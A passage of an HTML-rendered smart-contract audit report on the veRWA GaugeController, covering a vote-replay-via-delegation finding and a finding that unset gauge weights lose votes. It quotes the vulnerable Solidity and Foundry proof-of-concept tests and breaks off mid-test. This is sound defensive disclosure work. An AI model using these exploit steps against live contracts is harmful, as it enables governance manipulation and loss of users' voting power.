class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">gauge_relative_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">), </span><span class=\"mtk7\">954545454545454545</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</details>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Vscode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past.</p>\n<p>Additionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/396#issuecomment-1693179514\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Chosen as best due to the clear and concise explanation, including business impact on the protocol, and including an executable PoC.</p>\n</blockquote>\n<p> <strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/86\">OpenCoreCH (veRWA) confirmed on duplicate finding 86</a></strong></p>\n<hr>\n<h2 id=\"h-03-when-adding-a-gauge-its-initial-value-has-to-be-set-by-an-admin-or-all-voting-power-towards-it-will-be-lost\" style=\"position:relative;\"><a href=\"#h-03-when-adding-a-gauge-its-initial-value-has-to-be-set-by-an-admin-or-all-voting-power-towards-it-will-be-lost\" aria-label=\"h 03 when adding a gauge its initial value has to be set by an admin or all voting power towards it will be lost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/288\">[H-03] When adding a gauge, its initial value has to be set by an admin or all voting power towards it will be lost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/288\">deadrxsezzz</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/442\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/398\">0xComfyCat</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/331\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/287\">Brenzee</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/169\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/401\">auditsea</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/390\">cducrest</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/306\">markus_ether</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/262\">Team_Rocket</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L118\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L118</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L204\">https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L204</a></p>\n<p>Voting power towards gauges will be lost and project will not work properly</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The mapping <code>time_weight</code> takes a gauge as a param and returns the most recent timestamp a gauge has had its weight recorded/ updated. There are 2 ways to set this value: through <code>_get_weight</code> and <code>_change_gauge_weight</code>.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_get_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">time_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">t</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Point</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">points_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">][</span><span class=\"mtk12\">t</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">500</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">t</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) </span><span class=\"mtk15\">break</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">t</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d_slope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changes_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">][</span><span class=\"mtk12\">t</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">d_slope</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">points_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">][</span><span class=\"mtk12\">t</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">t</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) </span><span class=\"mtk12\">time_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">t</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The problem in <code>_get_weight</code> is that the initial value of any <code>time_weight[_gauge_addr]</code> will be 0. It will go through the entirety of the loop and <code>t</code> will increase +1 week for every iteration. The problem is that even after 500 iterations <code>t</code> will be <code>&#x3C; block.timestamp</code> so the value of <code>time_weight[_gauge_addr]</code> will remain 0. Unless admins call manually <code>_change_gauge_weight</code> to set an initial value, <code>time_weight[_gauge_addr]</code> will remain 0. Any  time a user will use <code>_get_weight</code> to fill with recent data, the function will iterate over old values and will do nothing. Recent values won’t be set and anything depending on it will receive 0 as a recent value.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gauge</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">old_gauge_weight</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_get_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_gauge</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">old_sum</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_get_sum</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">next_time</span><span class=\"mtk1\"> = ((</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">points_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge</span><span class=\"mtk1\">][</span><span class=\"mtk12\">next_time</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">time_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">next_time</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">new_sum</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">old_sum</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">old_gauge_weight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">points_sum</span><span class=\"mtk1\">[</span><span class=\"mtk12\">next_time</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">new_sum</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">time_sum</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">next_time</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Since <code>_change_gauge_weight</code> is not called within <code>add_gauge</code>, even if we expect the owners to call it, any votes happening in the time between the adding of the gauge and the admin set function will be lost. The user will only be able to retrieve them by later removing their vote and voting again.\nHere are 3 written test-cases which prove the statements above:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testWithoutManualSet</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after voting: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testWithManualSet</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s weight after voting: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testWithChangeMidway</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;gauge&#39;s 